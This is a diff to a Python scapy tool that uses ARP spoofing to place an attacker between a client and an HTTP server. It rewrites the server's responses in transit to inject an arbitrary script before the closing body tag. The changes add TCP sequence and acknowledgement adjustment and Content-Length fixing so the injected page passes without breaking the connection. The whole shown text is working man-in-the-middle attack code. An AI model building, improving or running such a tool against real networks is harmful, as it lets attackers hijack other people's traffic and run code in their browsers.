@@ -1,4 +1,5 @@
 #!/usr/bin/env python3
+import traceback
 import re
 from scapy.all import *
 
@@ -7,14 +8,28 @@ import sys
 import threading
 import time
 
+FIN = 0x01
+SYN = 0x02
+RST = 0x04
+PSH = 0x08
+ACK = 0x10
+URG = 0x20
+ECE = 0x40
+CWR = 0x80
+
 
 def parse_arguments():
     parser = argparse.ArgumentParser()
-    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
-    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
-    parser.add_argument("-ip3", "--serverIP", help="IP of the server", required=True)
-    parser.add_argument("-s", "--script", help="script to inject", required=True)
-    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
+    parser.add_argument("-i", "--interface",
+                        help="network interface to bind to", required=True)
+    parser.add_argument("-ip1", "--clientIP",
+                        help="IP of the client", required=True)
+    parser.add_argument("-ip3", "--serverIP",
+                        help="IP of the server", required=True)
+    parser.add_argument(
+        "-s", "--script", help="script to inject", required=True)
+    parser.add_argument("-v", "--verbosity",
+                        help="verbosity level (0-2)", default=0, type=int)
     return parser.parse_args()
 
 
@@ -53,48 +68,80 @@ def restore(srcIP, srcMAC, dstIP, dstMAC):
     spoof(srcIP, srcMAC, dstIP, dstMAC)
 
 
+tcpStates = dict()
+
+
 def faketcp(packet):
     try:
         del packet[IP].len
         del packet[IP].chksum
         del packet[TCP].chksum
-        load = packet[Raw].load.decode('utf-8')
+        state = (packet[TCP].sport+packet[TCP].dport)
+        if state not in tcpStates:
+            debug(f'Initialize {packet[TCP].sport}->{packet[TCP].dport}')
+            tcpStates[state] = {'nb_more': 0, 'fin': False}
 
-        # Recalculate content length
-        loads = list(map(lambda x:
-                            x.split(':')[0] + ': ' + str(int(x.split(':')[1]) + len(args.script) + len('<script></script>'))
-                                if x.startswith('Content-Length:') else x,
-                            load.split('\r\n')))
-        load = '\r\n'.join(loads)
+        if packet.haslayer(Raw):
+            oldlen = len(packet[Raw].load)
+            load = packet[Raw].load.decode('utf-8')
 
-        target = re.compile(re.escape('</body>'), re.IGNORECASE)
-        script = f'<script>{args.script}</script></body>'
-        load = target.sub(script, load)
-        packet[Raw].load = load
+            # Recalculate content length
+            loads = list(map(lambda x:
+                             x.split(':')[0] + ': ' + str(int(x.split(':')[1]) +
+                                                          len(args.script) + len('<script></script>'))
+                             if x.startswith('Content-Length:') else x,
+                             load.split('\r\n')))
+            load = '\r\n'.join(loads)
+
+            target = re.compile(re.escape('</body>'), re.IGNORECASE)
+            script = f'<script>{args.script}</script></body>'
+            load = target.sub(script, load)
+            packet[Raw].load = load.encode('utf-8')
+
+            len_more = len(packet[Raw].load) - oldlen
+            debug(f'Len more: {len_more}')
+
+        packet.seq += tcpStates[state]['nb_more']
+        packet.ack -= tcpStates[state]['nb_more']
+
+        if packet.haslayer(Raw):
+            tcpStates[state]['nb_more'] += len_more
+
+        if tcpStates[state]['fin'] and packet[TCP].flags.F:
+            del tcpStates[state]
+            debug(f'Tear Down {packet[TCP].sport}->{packet[TCP].dport}')
+        elif packet[TCP].flags.F and packet[TCP].flags.A:
+            tcpStates[state]['fin'] = True
+            debug(
+                f'About to Tear Down {packet[TCP].sport}->{packet[TCP].dport}')
+
         return packet
     except Exception as e:
         debug(f'Error in faketcp: {e}')
+        traceback.print_exc()
+        print(tcpStates)
         return packet
 
 
 def handle_packet(p):
     global clientMAC, clientIP, httpServerIP, httpServerMAC, attackerIP, attackerMAC
     try:
-        if p[Ether].src == attackerMAC:  # Ignore our own spoofing packets
+        # Ignore our own spoofing packets
+        if p[Ether].src == attackerMAC:
             return
-        debug(f'Sniffed: {p.summary()}')
-
-        if p.haslayer(Raw) and p.haslayer(TCP) and p[TCP].sport == 80:
+        if p[Ether].src != attackerMAC and p.haslayer(TCP):
+            debug(f'Sniffed: {p.summary()}')
             p = faketcp(p)
 
+        # if p.haslayer(TCP):
+            # debug(f'Sniffed: {p.summary()}')
+
         p[Ether].src = attackerMAC
-        if p[IP].dst == httpServerIP:
-            p[Ether].dst = httpServerMAC
-        if p[IP].dst == clientIP:
-            p[Ether].dst = clientMAC
+        p[Ether].dst = None
         sendp(p, iface=conf.iface)
     except Exception as e:
         debug(f'Error when sniffing: {e}')
+        debug(f'Packet is: {p.summary()}')
     pass
 
 # NOTE: this intercepts all packets that are sent AND received by the attacker, so
